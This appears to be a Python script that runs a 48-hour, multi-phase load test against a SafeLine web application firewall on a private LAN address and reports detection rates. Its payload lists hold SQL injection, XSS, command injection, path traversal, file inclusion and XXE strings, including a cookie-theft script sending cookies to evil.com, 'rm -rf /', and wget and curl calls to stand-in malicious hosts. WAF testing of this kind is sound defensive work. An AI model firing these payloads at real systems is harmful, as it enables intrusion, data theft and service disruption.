#!/usr/bin/env python3
"""
SafeLine WAF 48-Hour Continuous Load Test Campaign
Comprehensive attack simulation with monitoring and reporting
"""

import urllib.request
import urllib.parse
import urllib.error
import threading
import time
import json
import random
import os
import signal
import sys
from datetime import datetime, timedelta
import concurrent.futures
from collections import defaultdict
import csv

class ContinuousLoadTester:
    def __init__(self, target_url="http://localhost", duration_hours=48):
        self.target_url = target_url.rstrip('/')
        self.duration_hours = duration_hours
        self.duration_seconds = duration_hours * 3600
        self.start_time = None
        self.stop_flag = threading.Event()
        self.results = []
        self.metrics = defaultdict(list)
        self.phase_results = {}
        
        # Advanced attack patterns for comprehensive testing
        self.attack_patterns = {
            'sql_injection': [
                "1' OR '1'='1",
                "1' UNION SELECT null,null,null--",
                "1'; DROP TABLE users--",
                "1' AND (SELECT SLEEP(5))--",
                "admin'--",
                "1' OR 1=1#",
                "'; SELECT * FROM information_schema.tables--",
                "1' UNION ALL SELECT NULL,NULL,NULL--",
                "admin'; EXEC xp_cmdshell('dir')--",
                "1' OR 'a'='a"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>",
                "<div onclick=alert('XSS')>Click me</div>",
                "<input onfocus=alert('XSS') autofocus>",
                "'\"><script>alert('XSS')</script>",
                "<script>document.location='http://evil.com?'+document.cookie</script>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "|| uname -a",
                "; rm -rf /",
                "| ls -la",
                "&& curl http://evil.com",
                "; ping -c 1 127.0.0.1",
                "| nc -l 4444",
                "&& wget http://malicious.com/shell.sh"
            ],
            'path_traversal': [
                "../../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd%00",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "../../../root/.bash_history",
                "..\\..\\..\\boot.ini"
            ],
            'file_inclusion': [
                "file:///etc/passwd",
                "php://input",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://id"
            ],
            'xxe': [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>"
            ]
        }
        
        # Test phases with different intensities
        self.test_phases = [
            {"name": "warmup", "duration": 0.5, "rps": 10, "threads": 5},
            {"name": "low_intensity", "duration": 6, "rps": 25, "threads": 10},
            {"name": "medium_intensity", "duration": 12, "rps": 50, "threads": 20},
            {"name": "high_intensity", "duration": 18, "rps": 100, "threads": 40},
            {"name": "peak_load", "duration": 8, "rps": 200, "threads": 60},
            {"name": "cooldown", "duration": 3.5, "rps": 15, "threads": 8}
        ]
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        print(f"\n🛑 Received signal {signum}, initiating graceful shutdown...")
        self.stop_flag.set()
    
    def make_attack_request(self, attack_type, payload, endpoint="/"):
        """Execute single attack request with comprehensive logging"""
        start_time = time.time()
        attack_id = f"{attack_type}_{int(time.time()*1000000) % 1000000}"
        
        try:
            # Prepare URL with payload
            if endpoint == "/":
                url = f"{self.target_url}/?q={urllib.parse.quote(payload)}"
            else:
                url = f"{self.target_url}{endpoint}?param={urllib.parse.quote(payload)}"
            
            # Create request with headers
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'SafeLine-ContinuousTest/2.0')
            req.add_header('X-Forwarded-For', f"192.168.{random.randint(1,255)}.{random.randint(1,255)}")
            
            # Handle HTTPS without certificate verification
            if self.target_url.startswith('https'):
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with urllib.request.urlopen(req, timeout=15, context=context) as response:
                    response_time = time.time() - start_time
                    status_code = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    blocked = self._is_blocked(status_code, content)
            else:
                with urllib.request.urlopen(req, timeout=15) as response:
                    response_time = time.time() - start_time
                    status_code = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    blocked = self._is_blocked(status_code, content)
            
            return {
                'timestamp': start_time,
                'attack_id': attack_id,
                'attack_type': attack_type,
                'payload': payload[:100],
                'status_code': status_code,
                'response_time': response_time,
                'blocked': blocked,
                'success': True,
                'content_length': len(content)
            }
        
        except urllib.error.HTTPError as e:
            response_time = time.time() - start_time
            blocked = e.code in [403, 406, 429, 444, 451]
            
            return {
                'timestamp': start_time,
                'attack_id': attack_id,
                'attack_type': attack_type,
                'payload': payload[:100],
                'status_code': e.code,
                'response_time': response_time,
                'blocked': blocked,
                'success': True,
                'error': f"HTTP {e.code}"
            }
        
        except Exception as e:
            return {
                'timestamp': start_time,
                'attack_id': attack_id,
                'attack_type': attack_type,
                'payload': payload[:100],
                'status_code': 0,
                'response_time': time.time() - start_time,
                'blocked': False,
                'success': False,
                'error': str(e)
            }
    
    def _is_blocked(self, status_code, content):
        """Enhanced block detection logic"""
        if status_code in [403, 406, 429, 444, 451]:
            return True
        
        # Check content for SafeLine block indicators
        block_indicators = [
            'blocked', 'denied', 'security', 'safeline', 'waf',
            'forbidden', 'unauthorized', 'suspicious', 'threat'
        ]
        content_lower = content.lower()
        
        for indicator in block_indicators:
            if indicator in content_lower:
                return True
        
        return False
    
    def continuous_attack_worker(self, phase_config, phase_start_time):
        """Worker thread for continuous attack generation"""
        phase_duration = phase_config['duration'] * 3600  # Convert to seconds
        phase_end_time = phase_start_time + phase_duration
        request_interval = 1.0 / phase_config['rps']
        
        local_results = []
        requests_sent = 0
        
        print(f"🚀 Phase '{phase_config['name']}' worker started - Target: {phase_config['rps']} RPS")
        
        while time.time() < phase_end_time and not self.stop_flag.is_set():
            try:
                # Select random attack pattern
                attack_type = random.choice(list(self.attack_patterns.keys()))
                payload = random.choice(self.attack_patterns[attack_type])
                
                # Random endpoint selection
                endpoints = ["/", "/api/data", "/search", "/login", "/admin"]
                endpoint = random.choice(endpoints)
                
                # Execute attack
                result = self.make_attack_request(attack_type, payload, endpoint)
                result['phase'] = phase_config['name']
                local_results.append(result)
                requests_sent += 1
                
                # Rate limiting with jitter
                jitter = random.uniform(0.8, 1.2)
                time.sleep(request_interval * jitter)
                
            except Exception as e:
                print(f"❌ Worker error in phase {phase_config['name']}: {e}")
                continue
        
        print(f"✅ Phase '{phase_config['name']}' worker completed - Sent {requests_sent} requests")
        return local_results
    
    def run_test_phase(self, phase_config):
        """Execute a single test phase with multiple workers"""
        print(f"\n🔥 Starting phase: {phase_config['name']}")
        print(f"   Duration: {phase_config['duration']} hours")
        print(f"   Target RPS: {phase_config['rps']}")
        print(f"   Threads: {phase_config['threads']}")
        
        phase_start_time = time.time()
        
        # Start worker threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=phase_config['threads']) as executor:
            futures = []
            
            for i in range(phase_config['threads']):
                future = executor.submit(self.continuous_attack_worker, phase_config, phase_start_time)
                futures.append(future)
            
            # Collect results
            phase_results = []
            for future in concurrent.futures.as_completed(futures):
                try:
                    thread_results = future.result()
                    phase_results.extend(thread_results)
                except Exception as e:
                    print(f"❌ Thread failed in phase {phase_config['name']}: {e}")
        
        # Store phase results
        self.phase_results[phase_config['name']] = phase_results
        self.results.extend(phase_results)
        
        # Phase summary
        if phase_results:
            blocked_count = sum(1 for r in phase_results if r.get('blocked', False))
            avg_response_time = sum(r.get('response_time', 0) for r in phase_results) / len(phase_results)
            
            print(f"📊 Phase '{phase_config['name']}' completed:")
            print(f"   Total requests: {len(phase_results)}")
            print(f"   Blocked requests: {blocked_count}")
            print(f"   Detection rate: {(blocked_count/len(phase_results)*100):.1f}%")
            print(f"   Avg response time: {avg_response_time*1000:.1f}ms")
    
    def run_continuous_campaign(self):
        """Execute complete 48-hour test campaign"""
        print("🚀 SafeLine WAF 48-Hour Continuous Load Test Campaign")
        print("=" * 70)
        print(f"Start time: {datetime.now()}")
        print(f"Target URL: {self.target_url}")
        print(f"Duration: {self.duration_hours} hours")
        print(f"Estimated end time: {datetime.now() + timedelta(hours=self.duration_hours)}")
        
        self.start_time = time.time()
        
        # Create results directory
        os.makedirs("/home/pt/SafeLine/continuous_test_results", exist_ok=True)
        
        # Execute test phases
        for phase in self.test_phases:
            if self.stop_flag.is_set():
                print("🛑 Test campaign interrupted by user")
                break
            
            self.run_test_phase(phase)
            
            # Save intermediate results
            self.save_intermediate_results()
        
        # Final analysis and reporting
        self.generate_final_report()
        
        print(f"\n🎉 48-Hour test campaign completed!")
        print(f"Total duration: {(time.time() - self.start_time)/3600:.2f} hours")
    
    def save_intermediate_results(self):
        """Save intermediate results during the test"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON results
        with open(f"/home/pt/SafeLine/continuous_test_results/intermediate_{timestamp}.json", 'w') as f:
            json.dump({
                'metadata': {
                    'timestamp': datetime.now().isoformat(),
                    'target_url': self.target_url,
                    'elapsed_hours': (time.time() - self.start_time) / 3600,
                    'total_requests': len(self.results)
                },
                'phase_results': self.phase_results,
                'raw_results': self.results[-1000:]  # Last 1000 results to save space
            }, f, indent=2)
    
    def generate_final_report(self):
        """Generate comprehensive final test report"""
        if not self.results:
            print("❌ No results to analyze")
            return
        
        print("\n📊 Generating final comprehensive report...")
        
        # Overall statistics
        total_requests = len(self.results)
        successful_requests = sum(1 for r in self.results if r.get('success', False))
        blocked_requests = sum(1 for r in self.results if r.get('blocked', False))
        
        # Response time analysis
        response_times = [r['response_time'] for r in self.results if r.get('response_time', 0) > 0]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Attack type breakdown
        attack_breakdown = defaultdict(lambda: {'total': 0, 'blocked': 0})
        for result in self.results:
            attack_type = result.get('attack_type', 'unknown')
            attack_breakdown[attack_type]['total'] += 1
            if result.get('blocked', False):
                attack_breakdown[attack_type]['blocked'] += 1
        
        # Calculate detection rates
        for attack_type in attack_breakdown:
            total = attack_breakdown[attack_type]['total']
            blocked = attack_breakdown[attack_type]['blocked']
            attack_breakdown[attack_type]['detection_rate'] = (blocked / total * 100) if total > 0 else 0
        
        # Phase analysis
        phase_analysis = {}
        for phase_name, phase_results in self.phase_results.items():
            if phase_results:
                phase_blocked = sum(1 for r in phase_results if r.get('blocked', False))
                phase_avg_rt = sum(r.get('response_time', 0) for r in phase_results) / len(phase_results)
                phase_analysis[phase_name] = {
                    'total_requests': len(phase_results),
                    'blocked_requests': phase_blocked,
                    'detection_rate': (phase_blocked / len(phase_results) * 100),
                    'avg_response_time': phase_avg_rt * 1000
                }
        
        # Print summary
        print(f"\n{'='*70}")
        print("🎯 SAFELINE WAF 48-HOUR LOAD TEST FINAL REPORT")
        print(f"{'='*70}")
        print(f"📅 Test Period: {datetime.fromtimestamp(self.start_time)} - {datetime.now()}")
        print(f"⏱️  Duration: {(time.time() - self.start_time)/3600:.2f} hours")
        print(f"🎯 Target URL: {self.target_url}")
        print(f"📊 Total Requests: {total_requests:,}")
        print(f"✅ Successful Requests: {successful_requests:,}")
        print(f"🛡️  Blocked Requests: {blocked_requests:,}")
        print(f"🔍 Overall Detection Rate: {(blocked_requests/total_requests*100):.1f}%")
        print(f"⚡ Average Response Time: {avg_response_time*1000:.1f}ms")
        print(f"📈 Actual RPS: {total_requests/(time.time()-self.start_time):.1f}")
        
        print(f"\n{'='*50}")
        print("🎯 ATTACK TYPE ANALYSIS")
        print(f"{'='*50}")
        for attack_type, stats in attack_breakdown.items():
            print(f"{attack_type.upper()}: {stats['blocked']}/{stats['total']} blocked ({stats['detection_rate']:.1f}%)")
        
        print(f"\n{'='*50}")
        print("📊 PHASE ANALYSIS")
        print(f"{'='*50}")
        for phase_name, stats in phase_analysis.items():
            print(f"{phase_name.upper()}:")
            print(f"  Requests: {stats['total_requests']:,}")
            print(f"  Blocked: {stats['blocked_requests']:,} ({stats['detection_rate']:.1f}%)")
            print(f"  Avg Response Time: {stats['avg_response_time']:.1f}ms")
        
        # Save comprehensive results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON report
        final_report = {
            'metadata': {
                'timestamp': datetime.now().isoformat(),
                'target_url': self.target_url,
                'duration_hours': (time.time() - self.start_time) / 3600,
                'total_requests': total_requests
            },
            'summary': {
                'total_requests': total_requests,
                'successful_requests': successful_requests,
                'blocked_requests': blocked_requests,
                'overall_detection_rate': (blocked_requests / total_requests * 100) if total_requests > 0 else 0,
                'avg_response_time_ms': avg_response_time * 1000,
                'actual_rps': total_requests / (time.time() - self.start_time)
            },
            'attack_breakdown': dict(attack_breakdown),
            'phase_analysis': phase_analysis,
            'test_phases': self.test_phases
        }
        
        with open(f"/home/pt/SafeLine/continuous_test_results/final_report_{timestamp}.json", 'w') as f:
            json.dump(final_report, f, indent=2)
        
        # CSV summary
        with open(f"/home/pt/SafeLine/continuous_test_results/summary_{timestamp}.csv", 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Metric', 'Value'])
            writer.writerow(['Total Requests', total_requests])
            writer.writerow(['Blocked Requests', blocked_requests])
            writer.writerow(['Detection Rate (%)', f"{(blocked_requests/total_requests*100):.1f}"])
            writer.writerow(['Avg Response Time (ms)', f"{avg_response_time*1000:.1f}"])
            writer.writerow(['Actual RPS', f"{total_requests/(time.time()-self.start_time):.1f}"])
            writer.writerow(['Duration (hours)', f"{(time.time()-self.start_time)/3600:.2f}"])
        
        print(f"\n📁 Final reports saved:")
        print(f"   JSON: final_report_{timestamp}.json")
        print(f"   CSV: summary_{timestamp}.csv")

def main():
    """Main execution function"""
    target_url = "http://192.168.18.177"
    duration_hours = 48
    
    print("🔥 SafeLine WAF 48-Hour Continuous Attack Campaign")
    print("⚠️  WARNING: This is a defensive security test!")
    print("⚠️  Only run against systems you own or have permission to test!")
    
    # Initialize tester
    tester = ContinuousLoadTester(target_url, duration_hours)
    
    # Run continuous campaign
    try:
        tester.run_continuous_campaign()
    except KeyboardInterrupt:
        print("\n🛑 Test interrupted by user")
        tester.stop_flag.set()
        tester.generate_final_report()
    except Exception as e:
        print(f"\n❌ Test failed: {e}")
        if tester.results:
            tester.generate_final_report()

if __name__ == "__main__":
    main()